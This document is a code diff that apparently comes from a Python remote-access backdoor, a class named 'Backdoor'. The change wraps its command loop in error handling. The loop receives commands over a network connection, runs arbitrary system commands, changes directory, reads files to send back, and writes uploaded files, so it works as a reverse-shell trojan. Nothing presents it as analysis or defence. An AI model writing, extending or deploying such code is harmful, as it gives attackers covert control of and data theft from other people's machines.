@@ -47,25 +47,30 @@ class Backdoor:
         while True:
             command = self.reliable_receive()
 
-            # Incoming command exit
-            if command[0] == "exit":
-                self.connection.close()
-                exit()
+            try:
 
-            # Incoming command cd with path
-            elif command[0] == "cd" and len(command) > 1:
-                command_result = self.change_working_directory_to(command[1])
+                # Incoming command exit
+                if command[0] == "exit":
+                    self.connection.close()
+                    exit()
 
-            # Incoming command download with file path
-            elif command[0] == "download":
-                command_result = self.read_file(command[1])
+                # Incoming command cd with path
+                elif command[0] == "cd" and len(command) > 1:
+                    command_result = self.change_working_directory_to(command[1])
 
-            # Incoming upload command with file and content
-            elif command[0] == "upload":
-                command_result = self.write_file(command[1], command[2])
+                # Incoming command download with file path
+                elif command[0] == "download":
+                    command_result = self.read_file(command[1])
 
-            else:
-                command_result = self.execute_system_command(command)
+                # Incoming upload command with file and content
+                elif command[0] == "upload":
+                    command_result = self.write_file(command[1], command[2])
+
+                else:
+                    command_result = self.execute_system_command(command)
+
+            except Exception:  # Except any exception error
+                command_result = "[-] Error during command execution"
 
             self.reliable_send(command_result)
 
